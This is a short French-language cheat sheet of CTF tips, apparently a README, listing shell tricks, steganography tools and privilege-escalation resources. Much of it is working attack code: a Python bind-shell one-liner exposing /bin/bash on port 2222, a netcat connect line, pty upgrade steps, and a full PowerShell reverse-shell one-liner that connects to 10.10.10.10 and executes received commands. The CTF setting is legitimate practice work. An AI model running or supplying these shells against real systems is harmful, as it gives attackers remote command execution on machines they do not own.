Tips et tools utiles pour les CTFs

# Tips
## Unix 
Merci à @Clayno pour ses tips!

### Obtenir un shell
Pour ouvrir une connexion sur le port 2222:
```
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
```
La connexion sur l'hôte se fait via 
```
nc -nv [adresse] 2222
```
Améliorer le shell en pty et avoir l'autocomplétion:
```
python -c "import pty; pty.spawn('/bin/bash')"
CTRL+Z
stty raw -echo
fg

#### Dans le webshell ###
export SHELL=bash
export TERM=xterm256-color
stty rows 38 columns 116
```
### Powershell Reverse shell OneLiner (@Nikhil SamratAshok Mittal)
```
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Tools pour palier le manque d'inspiration 
Checker les différents tools : https://github.com/zardus/ctf-tools

## Steganographie
Tester zsteg

Cheat sheet : https://pequalsnp-team.github.io/cheatsheet/steganography-101


## Privesc

Liste d'exploit : https://github.com/FuzzySecurity/Unix-PrivEsc
Privesc checker : https://github.com/pentestmonkey/unix-privesc-check (ESSAYER LES DEUX BRANCHES)
